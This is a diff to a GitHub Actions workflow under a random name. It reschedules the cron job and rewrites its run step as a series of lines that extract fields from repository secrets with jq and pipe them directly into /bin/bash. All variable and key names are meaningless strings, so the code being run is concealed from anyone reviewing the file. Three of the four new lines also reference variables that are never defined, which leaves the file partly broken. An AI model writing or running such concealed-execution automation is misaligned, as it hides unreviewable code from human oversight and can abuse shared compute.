@@ -2,7 +2,8 @@ name: zhoujinwei2345
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 1/6 * * *'
+    - cron: '11 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,18 +12,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhoujinwei2345
         env:
-          vuj05: ${{ secrets.vuj05 }}
+          r7: ${{ secrets.r7 }}
         run: |
-          echo $vuj05 | jq -r .owthv69 | /bin/bash
-          echo $xxyq75 | jq -r .tpr5 | /bin/bash
-          echo $qxyr954 | jq -r .yjeb81 | /bin/bash
-          echo $v89570 | jq -r .sesm61 | /bin/bash
-          echo $f57 | jq -r .rke8187 | /bin/bash
-          echo $qyn46 | jq -r .zbdsg35293 | /bin/bash
-          echo $idi26070 | jq -r .tcrvg2366 | /bin/bash
-          echo $njm71399 | jq -r .ajug46778 | /bin/bash
-          echo $u88 | jq -r .mvvo8 | /bin/bash
-          echo $sumny364 | jq -r .jloe729 | /bin/bash
-          echo $yooer164 | jq -r .t28 | /bin/bash
-          echo $jjl1 | jq -r .mf46 | /bin/bash
+          echo $r7 | jq -r .pt51 | /bin/bash
+          echo $hxzh24 | jq -r .bzio8 | /bin/bash
+          echo $utcoy752 | jq -r .zgn62806 | /bin/bash
+          echo $ou02984 | jq -r .jbckl70797 | /bin/bash
 
